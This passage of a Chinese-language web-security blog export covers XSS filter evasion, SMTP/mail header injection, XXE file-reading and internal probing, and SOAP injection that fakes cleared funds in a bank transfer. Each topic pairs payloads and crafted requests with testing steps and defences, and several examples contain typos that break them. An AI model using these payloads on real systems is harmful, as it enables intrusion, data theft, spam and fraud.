<h6 id="使用JavaScript转义"><a href="#使用JavaScript转义" class="headerlink" title="使用JavaScript转义"></a>使用JavaScript转义</h6><p>JavaScript允许各种字符转义，可以通过这种方式避免包含原义格式的表达式。Unicode转义可用于表示JavaScript关键字中的字符，从而避开许多类型的过滤：</p>
<p><strong>&lt;script>a\u006cert(1);&lt;/script></strong></p>
<p>如果能够使用eval命令，就可以将其他命令以字符串格式传送给eval命令，从而执行这些命令。这样就可以利用各种字符串操纵技巧来隐藏执行的命令。</p>
<p>在JavaScript中，可以使用Unicode转义、十六进制转义和八进制转义：</p>
<p><strong>&lt;script>eval('a\u600cert(1)');&lt;script></strong></p>
<p><strong>&lt;script>eval('a\x6cert(1)');&lt;script></strong></p>
<p><strong>&lt;script>eval('a\154ert(1)');&lt;script></strong></p>
<p>此外， 字符串中的多余转义字符将被忽略：</p>
<p><strong>&lt;script>eval('a\l\ert\(1\)');&lt;script></strong></p>
<h6 id="动态构建字符串"><a href="#动态构建字符串" class="headerlink" title="动态构建字符串"></a>动态构建字符串</h6><p>可以使用其他技巧来动态构建在攻击中使用的字符串：</p>
<p><strong>&lt;script>eval('al' + 'ert(1)');&lt;/script></strong></p>
<p><strong>&lt;script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));&lt;/script></strong></p>
<p><strong>&lt;script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));&lt;/script></strong></p>
<h6 id="替代eval的方法"><a href="#替代eval的方法" class="headerlink" title="替代eval的方法"></a>替代eval的方法</h6><p>如果无直接调用eval命令，可以通过其他方法以字符串格式执行命令：</p>
<p><strong>&lt;script>'alert(1)'.replace(/. + /,eval)&lt;/script></strong></p>
<p><strong>&lt;script>function::['alert'](1)&lt;/script></strong></p>
<h6 id="替代圆点"><a href="#替代圆点" class="headerlink" title="替代圆点"></a>替代圆点</h6><p>如果圆点被阻止，可以使用以下方法解引用：</p>
<p><strong>&lt;script>alert(document['cookie'])&lt;/script></strong></p>
<p><strong>&lt;script>with(document)alert(cookie)&lt;/script></strong></p>
<h3 id="查找并利用保存型XSS漏洞"><a href="#查找并利用保存型XSS漏洞" class="headerlink" title="查找并利用保存型XSS漏洞"></a>查找并利用保存型XSS漏洞</h3><h4 id="在Web邮件应用程序中测试XSS"><a href="#在Web邮件应用程序中测试XSS" class="headerlink" title="在Web邮件应用程序中测试XSS"></a>在Web邮件应用程序中测试XSS</h4><h4 id="在上传文件中测试XSS"><a href="#在上传文件中测试XSS" class="headerlink" title="在上传文件中测试XSS"></a>在上传文件中测试XSS</h4><h4 id="混合文件攻击"><a href="#混合文件攻击" class="headerlink" title="混合文件攻击"></a>混合文件攻击</h4><h4 id="在通过Ajax上传的文件中测试XSS"><a href="#在通过Ajax上传的文件中测试XSS" class="headerlink" title="在通过Ajax上传的文件中测试XSS"></a>在通过Ajax上传的文件中测试XSS</h4><h3 id="查找并利用基于DOM的XSS漏洞"><a href="#查找并利用基于DOM的XSS漏洞" class="headerlink" title="查找并利用基于DOM的XSS漏洞"></a>查找并利用基于DOM的XSS漏洞</h3><h2 id="防止XSS攻击"><a href="#防止XSS攻击" class="headerlink" title="防止XSS攻击"></a>防止XSS攻击</h2><h3 id="防止反射型与保存型XSS漏洞"><a href="#防止反射型与保存型XSS漏洞" class="headerlink" title="防止反射型与保存型XSS漏洞"></a>防止反射型与保存型XSS漏洞</h3><h4 id="确认输入"><a href="#确认输入" class="headerlink" title="确认输入"></a>确认输入</h4><h4 id="确认输出"><a href="#确认输出" class="headerlink" title="确认输出"></a>确认输出</h4><h4 id="消除危险的插入点"><a href="#消除危险的插入点" class="headerlink" title="消除危险的插入点"></a>消除危险的插入点</h4><h4 id="允许有限的HTML"><a href="#允许有限的HTML" class="headerlink" title="允许有限的HTML"></a>允许有限的HTML</h4><h3 id="防止基于DOM的XSS漏洞"><a href="#防止基于DOM的XSS漏洞" class="headerlink" title="防止基于DOM的XSS漏洞"></a>防止基于DOM的XSS漏洞</h3><h4 id="确认输入-1"><a href="#确认输入-1" class="headerlink" title="确认输入"></a>确认输入</h4><h4 id="确认输出-1"><a href="#确认输出-1" class="headerlink" title="确认输出"></a>确认输出</h4></script></p></li></ul>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>XSS攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>注入电子邮件</title>
    <url>/2019/04/01/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-5-%E6%B3%A8%E5%85%A5email/</url>
    <content><![CDATA[<h1 id="注入电子邮件"><a href="#注入电子邮件" class="headerlink" title="注入电子邮件"></a>注入电子邮件</h1><p>许多应用程序拥有一项允许用户通过应用程序提交消息的功能。例如，向支持人员报告问题或提供关于Web点反馈。这项功能一般通过邮件（或SMTP）服务器执行。通常，用户提交的输入被插入到邮件服务器处理的SMTP会话中。如果攻击者能够提交未被过滤或净化的专门设计的输入，就可以在这个会话中注入任意SMTP命令。</p>
<p>多数时候，应用程序允许用户指定消息的内容和自己的电子邮件地址（插入到生成电子邮件的From字段），还可以指定消息的主题和其他细节。能够控制的任何字段都易于受到SMTP注入。</p>
<p>SMTP注入漏洞经常被垃圾邮件发送者利用，他们扫描因特网查找易受攻击的邮件表单，并使用它们生成大量垃圾邮件。</p>
<h2 id="操纵电子邮件标头"><a href="#操纵电子邮件标头" class="headerlink" title="操纵电子邮件标头"></a>操纵电子邮件标头</h2><p>假设有下面的邮件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-main.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn<span class="string">'t load</span></span><br></pre></td></tr></table></figure>

<p>PHP <strong>mail()</strong>命令使用additional_headers参数为消息设定发件人地址。这个参数还可用于指定其他标头，包括Cc和Bcc，并用换行符分割每个被请求的标头。因此攻击者可以通过在From字段中注入这其中的某个标头，将邮件发送给任意收件人。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">To: admin@wahh-app.com%<span class="number">0</span>ABC从：all@wahh-othercompany.com</span><br><span class="line">From: marcus@wahh-main.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn<span class="string">'t load</span></span><br></pre></td></tr></table></figure>

<p>这会导致<strong>mail()</strong>命令生成以下邮件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-main.com</span><br><span class="line">Bcc: all@wahh-othercompany.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn<span class="string">'t load</span></span><br></pre></td></tr></table></figure>

<h2 id="SMTP命令注入"><a href="#SMTP命令注入" class="headerlink" title="SMTP命令注入"></a>SMTP命令注入</h2><p>在其他情况下，应用程序可能会执行SMTP会话，或将用户提交的输入传送一个以不同的组件以完成这一任务。这时，我们就可以直接在这个会话中注入任意SMTP命令，完全控制由应用程序生成的消息。</p>
<p>例如，以一个使用以下请求提交站点反馈的应用程序为例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST feedback.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: wahh-app.com</span><br><span class="line">Content-Length: <span class="number">56</span></span><br><span class="line"></span><br><span class="line">From=daf@wahh-mail.com&amp;Subject=Site+feedback&amp;Message=foo</span><br></pre></td></tr></table></figure>

<p>应用程序会使用以下命令开始一个SMTP会话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MAIL FROM： daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA</span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site feedback</span><br><span class="line">foo</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>SMTP 客户端发出DATA命令后，应用程序送出电子邮件消息的内容，包括消息头和主体，然后发送一个点字符（.）。这告诉服务器消息已发送完毕，客户端可以发出其他SMTP命令，发送其他消息。</p>
<p>这时，攻击者可以在任何受控的电子邮件字段中注入任意SMTP命令。例如，他可以尝试注入Subject字段，如下所示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST feedback.php HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">Host: wahh-app.com</span><br><span class="line"></span><br><span class="line">Content-Length: <span class="number">266</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">From=daf@waff-mail.com&amp;Subject=Site+feedback%<span class="number">0</span>d%<span class="number">0</span>afoo%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">2</span>e%<span class="number">0</span>d%<span class="number">0</span>aMAIL+FROM:+mail@wahh-viagra.com%<span class="number">0</span>d%<span class="number">0</span>aRCPT+TO:+john@wahh-mail.com%<span class="number">0</span>d%<span class="number">0</span>aData%<span class="number">0</span>d%<span class="number">0</span>aFROM:+main@wahh-viagra.com%<span class="number">0</span>d%<span class="number">0</span>aTo:+jhon@wahh-mail.com%<span class="number">0</span>d%<span class="number">0</span>aSubject:+Cheap+VaAGR4%<span class="number">0</span>d%<span class="number">0</span>aBlah%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">2</span>e%<span class="number">0</span>d%<span class="number">0</span>a&amp;Message=Foo</span><br></pre></td></tr></table></figure>

<p>如果应用程序易受攻击，那么建立以下SMTP会话，它生成两个的电子邮件消息，其中第二个完全由攻击者控制：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MAIL FROM: daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA</span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site+feedback</span><br><span class="line">foo</span><br><span class="line">.</span><br><span class="line">MAIL FROM: mail@wahh-viagra.com</span><br><span class="line">RCPT TO: john@wahh-mail.com</span><br><span class="line">DATA</span><br><span class="line">From: mail@wahh-viagra.com</span><br><span class="line">To: john@wahh-mail.com</span><br><span class="line">Subject: Cheap V1AGR4</span><br><span class="line">Blah</span><br><span class="line">.</span><br><span class="line">foo</span><br></pre></td></tr></table></figure>

<h2 id="查找SMTP注入漏洞"><a href="#查找SMTP注入漏洞" class="headerlink" title="查找SMTP注入漏洞"></a>查找SMTP注入漏洞</h2><p>为了有效探查应用程序的邮件功能，需要测试每一个提交给电子邮件有关的功能的参数，甚至哪些最初可能与生成的消息无关的参数。</p>
<p>应当测试每一种攻击，并在每个测试中使用Windows和UNIX形式的换行符。</p>
<ol>
<li>应当发轮流提交西面的每个测试字符串作为每一个参数，在相关位置插入电子邮件地址。</li>
<li>留意应用程序返回的任何错误消息。如果这些错误与电子邮件功能中的任何问题有关，确定是否需要对输入进行调整，以利用漏洞。</li>
<li>应用程序的响应可能并不会以任何形式表示一个漏洞存在或被成功利用。应该监控指定的电子邮件地址，看是否收到任何电子邮件。</li>
<li>仔细检查生成相关请求的HTML表单。它们可能提供与服务器端使用的软件有关的线索。其中可能包含一个用于指定电子邮件收件人地址的隐藏或禁用字段，可以直接对其进行修改。</li>
</ol>
<h2 id="防止SMTP注入"><a href="#防止SMTP注入" class="headerlink" title="防止SMTP注入"></a>防止SMTP注入</h2><p>如果对提交电子邮件功能或SMTP会话使用的任何用户提交的数据进行严格的确认检查，就可以防止SMTP注入漏洞。因此，应根据其用途对每项数据进行尽可能严格的确认。</p>
<ul>
<li>应根据一个适当的正则表达式检查电子邮件地址（当然应拒绝所有换行符）</li>
<li>消息主体不得包含任何换行符，并应实施适当的长度限制</li>
<li>如果消息内容被一个SMTP会话直接使用，那么应禁止使用仅包含一个.字符的消息行。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>电子邮件</tag>
      </tags>
  </entry>
  <entry>
    <title>注入XML解释器</title>
    <url>/2019/03/29/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-3-%E6%B3%A8%E5%85%A5XML%E8%A7%A3%E9%87%8A%E5%99%A8/</url>
    <content><![CDATA[<h1 id="注入XML解释器"><a href="#注入XML解释器" class="headerlink" title="注入XML解释器"></a>注入XML解释器</h1><p>今天的Web应用程序大量使用XML，在浏览器与前端应用程序服务器之间传送的请求和响应，以及在后端应用程序组件（如SOAP服务）之间传送的消息中都可以找到XML。如果使用专门设计的输入破坏应用程序的运行并执行某些未授权的操作，这些位置就易于受到各种攻击。</p>
<h2 id="注入XML外部实体"><a href="#注入XML外部实体" class="headerlink" title="注入XML外部实体"></a>注入XML外部实体</h2><p>在今天的Web应用程序中，XML常用于从客户端向服务器提交数据。然后，服务器端应用程序将处理这些数据，并且可能会返回一个包含XML或任何其他格式数据的响应。在使用异步请求在后台进行通行的基于Ajax的应用程序中，这种行为最为常见。浏览器扩展组件和其他客户端技术也可能会用到XML。</p>
<p>以一个使用Ajax实现的、提供无缝用户体验的搜索功能为例。在用户输入搜索词时，客户端脚本将向服务器提出以下请求：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /search/128/AjaxSearch.ashx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Legth: 44</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span>nothing will change<span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务器的响应如下所示（无论响应采用什么格式，其中都可能存在漏洞）：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 81</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchResult</span>&gt;</span>No results found for expression: nothing will change<span class="tag">&lt;/<span class="name">SearchResult</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>客户端脚本将响应该处理，并用搜索结果对用户界面进行更新。</p>
<p>如果遇到这类类型的功能，应当始终检查其是存在XML外部实体（XXE）注入漏洞。之所以会出现这种漏洞，是因为标准的XML解析库支持使用实体引用。这些引用仅仅是在XML文档内部或外部引用数据的一种方法。</p>
<p>XML格式允许在XML文档中定义定制实体。这些实体在文档的开始部分的可选DOCTYPE元素中定义，例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span>[ <span class="meta">&lt;!ENTITY <span class="meta-keyword">testref</span> <span class="meta-string">"testrefvalue"</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果文档中包含以上定义，解析器将用testrefvalue这个已定义的值替代文档中出现在任何&testref;实体引用。</p>
<p>此外，XML规范允许使用外部引用来定义实体，XML解析器将动态提取这些实体的值。这些外部实体定义采用URL格式，并可以引用外部Web URL或本地文件系统上的资源。XML解析器将提取指定URL或文件的内容并将其作为已定义实体的值。如果应用程序在其响应中返回任何使用外部定义的实体的XML数据，则指定文件或URL的内容将在该响应中返回。</p>
<p>攻击者可以通过向XML添加适当的DOCTYPE元素，或通过修改该元素（如果它已经存在），在基于XML的请求中指定外部实体。外部实体引用使用SYSTEM关键字来指定，并使用URL（可能使用file:协议）进行定义。</p>
<p>在前一个示例中，攻击者可以提交以下请求（该请求定义一个引用服务器文件系统上的文件的XML外部实体）：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /search/128/AjaxSearch.ashx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Legth: 44</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DCOTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///windows/win.ini"</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>收到这个请求后，XML解析器将提取指定文件的内容，并使用该内容来替代已定义的实体引用（攻击者已经在SearchTerm元素中使用了该实体引用）。由于SearchTerm元素的值会在应用程序的响应中辉县，这回导致服务器以该文件的内容作出响应。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 556</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchResult</span>&gt;</span>No results found for expression: ; for 16-bit app support </span><br><span class="line">    [fonts]</span><br><span class="line">    [extensions]</span><br><span class="line">    [mci extensions]</span><br><span class="line">    [files]</span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">SearchResult</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>除使用file:协议来指定本地文件系统上的资源外，攻击者还可以使用http:等协议让服务器通过网络提取资源。这些URL可以指定任意主机、IP地址和端口。攻击者可以利用它们与后端系统上无法通过因特网直接访问的网络服务器进行交互。例如，以下攻击尝试连接到在专用IP地址192.168.1.1的端口25上运行的邮件服务器：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DCOTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.1.1"</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过这种技巧可以实施各种攻击，如下所示：</p>
<ul>
<li>攻击者可以将应用程序作为代理服务器使用，从应用程序能够访问的任何Web服务器上检索敏感内容，包括哪些在组织内部的专用非路由地址空间运行的内容。</li>
<li>攻击者可以利用后端Web应用程序中的漏洞，只要这些漏洞可以通过URL加以利用。</li>
<li>攻击者可以通过攻击大量IP地址和端口号，对后端系统上的开放端口进行测试。在某些情况下，可以使用实践性差异来推断所请求的端口的状态。其他时候，应用程序可能会在响应中返回某些服务的服务标题</li>
</ul>
<p>最后，如果应用程序检索外部实体，但并不在响应中返回该实体，则攻击者仍然可以通过无限期地读取某个文件流，从而实施拒绝服务攻击。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DCOTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:/// /dev/random"</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="注入SOAP"><a href="#注入SOAP" class="headerlink" title="注入SOAP"></a>注入SOAP</h2><p>SOAP(Simple Object Access Protocol, 简单对象访问协议)是一种使用XML格式封装数据，基于消息的通信技术。各种在不同操作系统和架构上运行的系统也使用它来共享信息和传递消息。它主要用在Web服务器中；通过浏览器访问的Web应用程序常常使用SOAP在后端应用程序组件之间进行通信。</p>
<p>由不同计算机执行单项任务以提高性能的大型企业应用程序经常使用SOAP。采用Web应用程序作为现有应用程序前段的情况也经常可以见到SOAP的身影。这时，应用程序通常使用SOAP在不同组件之间通信，以确保模块性和互用性。</p>
<p>由于XML是一种解释型语言，因此，和前面的描述的其他示例一样，SOAP也易于受到代码注入攻击，XML元素通过元字符&lt;,&gt;和/以语法形式表示。如果用户提交的数据中包含这些字符，并被直接插入到SOAP消息中，攻击者就能够破坏消息的结构，进而破坏应用程序的逻辑或造成其他不利影响。以一个银行应用程序为例，一名用户正使用下面的HTTP请求进行转账：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAccount08447656&amp;Submit-Submit</span><br></pre></td></tr></table></figure>

<p>在处理这个请求的过程中，应用程序在两个后端组件之间传送下面的SOAP消息：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelop</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www/w3/org/2001/12/soap-envelope"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">pre:Add</span> <span class="attr">xmlns:pre</span>=<span class="string">http:..target/lists</span> <span class="attr">soap:encodingStype</span>=<span class="string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Account</span>&gt;</span></span><br><span class="line">            	<span class="tag">&lt;<span class="name">FromAccount</span>&gt;</span>18281008<span class="tag">&lt;/<span class="name">FromAccount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Amount</span>&gt;</span>1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>False<span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span>08447656<span class="tag">&lt;/<span class="name">ToAccount</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelop</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意消息中的XML元素如何与HTTP请求中的参数对应起来，以及应用程序如何添加ClearedFunds元素。这时，应用程序逻辑确定账户中没有足够的资金进行转账，并将这个元素ClearedFunds的值设置为False，因此受到SOAP消息的组件将拒绝转账。</p>
<p>在这种情况下，攻击者可以通过各种方法注入SOAP消息，从而破坏应用程序的逻辑。例如，提交下面的请求会在最初的元素之前插入另外一个ClearedFunds元素（同时保持SQL语法的有效性）。如果应用程序处理它遇到的第一个ClearedFunds元素，那么即使账户中没有资金，也可以成功进行转账。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span><span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>True<span class="tag">&lt;<span class="name">Amount</span>&gt;</span><span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span>&amp;ToAccount08447656&amp;Submit-Submit</span><br></pre></td></tr></table></figure>

<p>另一方面，如果应用程序处理它遇到的后一个ClearedFunds元素，攻击者就可以在ToAccount参数中注入一个类似的攻击。</p>
<p>另一种类型的攻击时使用XML注释完全删除原始SOAP消息中的一个元素，并用攻击者自己设计的元素代替被删除的元素。例如，下面的请求通过Amount参数注入一个ClearedFunds元素，为ToAccount元素建立一个起始标签，开始一段注释，并在ToAccount参数中结束注释，从而保持XML语法的有效性：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span><span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>True<span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span><span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span><span class="comment">&lt;!--&amp;ToAccount=--&gt;</span>08447656&amp;Submit-Submit</span><br></pre></td></tr></table></figure>

<p>另一种攻击是尝试在一个注入的参数内完成整个SOAP消息，并将消息的剩余部分注释掉。但是，由于没有结束注释与起始注释相匹配，这种攻击会生成完全错误的XML语法，从而被许多XML解析器拒绝。这种攻击并不能在所有XML解析库中起作用，它只对定制或自主研发的XML解析器奏效。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span><span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>True</span><br><span class="line"><span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span>08447656<span class="tag">&lt;/<span class="name">ToAccount</span>&gt;</span><span class="tag">&lt;/<span class="name">Account</span>&gt;</span><span class="tag">&lt;/<span class="name">pre:Add</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&amp;Submit-Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="查找并利用SOAP注入"><a href="#查找并利用SOAP注入" class="headerlink" title="查找并利用SOAP注入"></a>查找并利用SOAP注入</h2><p>SOAP注入可能很难发现，因为随意提交XML元字符会破坏SOAP消息的格式，而且这样做生成的错误消息也及其简单。但是，使用下面的步骤依然可以相对可靠地检测出SOAP注入漏洞。</p>
<ol>
<li><p>轮流在每个参数中提交一个恶意XML结束标签，如。如果没有发生错误，那么输入可能没有插入到SOAP消息中，或者以某种方式被净化了。</p>
</li>
<li><p>如果出现错误，提交一堆有效的起始与结束标签，如<foo></foo>。如果这对标签使错误消失，那么应用程序可能易于受到攻击。</p>
</li>
<li><p>有些时候，插入到XML格式消息中的数据随后以XML格式被读取并返回给用户。如果修改的数据项在应用程序的响应中返回，看看提交任意XML内容是否以相同的形式返回，或者已通过某种方式被规范化。轮流提交下面两个值：</p>
<p>test<foo></foo></p>
<p>test<foo></foo></p>
<p>如果发现其中一个值的返回结果为另一个值，或者只返回test，那么可以确信输入被插入到了XML消息中。</p>
</li>
<li><p>如果HTTP请求中包含几个可放入SOAP消息的参数，尝试在一个参数中插入起始注释字符/&lt;!–，在另一个参数中插入结束注释字符!–/&gt;。然后，轮换在参数中插入这两个字符。这样做可能会把服务器SOAP消息中的某个部分作为注释处理，从而改变应用程序的逻辑，或者形成一个可造成信息泄露的不同错误条件。</p>
</li>
</ol>
<p>如果SOAP注入很难发现，就更难对其加以利用。许多时候，需要知道数据周围的XML的结构，以提交专门设计的输入，修改消息内容而不致破坏它的结构。在前面描述的所有测试中寻找任何揭示SOAP消息处理细节的错误消息。幸运的话，一条详细的错误消息将透露SOAP消息的完整内容，允许构建专门设计的值查找相关漏洞。如果不够幸运，就只能纯粹猜测，这样攻击成功的几率就非常低。</p>
<h2 id="防止SOAP注入"><a href="#防止SOAP注入" class="headerlink" title="防止SOAP注入"></a>防止SOAP注入</h2><p>我们可以在用户提交的数据被插入SOAP消息中的任何位置实施边界确认过滤，以防止SOAP注入。需要进行过滤的数据包括用户在当前请求中直接提交的数据，以及在前面请求中已经存在或由以用户数据位输入的其他处理过程生成的数据。</p>
<p>为防止上述攻击，应用程序应对出现在用户输入中的任何XML元字符进行HTML编码。HTML编码包含用对应的HTML实体替代字面量字符。这样做可确保XML解释器在进行处理时，把它们当做相关元素的数据值，而不是消息结构的一部分。一些进场造成问题的字符的HTML编码如下：</p>
<ul>
<li>&lt; - &amp;lt</li>
<li>&gt; - &amp;gt</li>
<li>/ - &amp;#47</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>操作文件路径</title>
    <url>/2019/03/27/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-2-%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<h1 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h1><p>如果应用程序使用用户可控制的数据、以危险的方式访问位于应用程序服务器或其他后端文件系统中的文件和目录，就会出现目录遍历漏洞。通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或者写入任意内容。这种漏洞往往使攻击者能够从服务器上读取敏感信息或者重写敏感文件，并最终在服务器上执行任何命令。</p>
<p>在下面的示例中，应用程序使用一个动态页面向客户端返回静态图像。被请求的图像名称在查询字符串参数中指定:</p>
